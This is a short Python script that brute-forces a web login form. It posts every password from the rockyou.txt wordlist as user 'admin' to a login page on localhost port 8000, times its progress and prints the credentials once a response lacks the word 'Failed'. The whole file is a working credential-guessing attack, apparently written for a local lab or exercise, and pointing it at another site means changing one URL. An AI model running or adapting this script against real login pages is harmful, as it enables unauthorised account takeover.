import requests
import time

uname = 'admin'

with open('rockyou.txt', mode='r', encoding='ISO-8859-1') as f:
    i=0
    total = 0
    start_time = time.time()
    for p in f:
        i+=1
        if i % 50 == 0:
            print(f"Tested {i} passwords in {time.time() - start_time:.2f} seconds")
            start_time=time.time()
            total +=i
            print(total)
            i = 0
            
        p=p[:-1]
			


        url = 'http://127.0.0.1:8000/login.html'
        payload = {'uname': uname, 'pword': p}
        # print(p)
        headers = {'Content-Type': 'application/x-www-form-urlencoded'
        }

        response = requests.post(url, headers=headers, data=payload)

        if "Failed" not in response.text:
        
            print("Login Successful")
            print("Username:Password is " + uname + ":" + p)
            break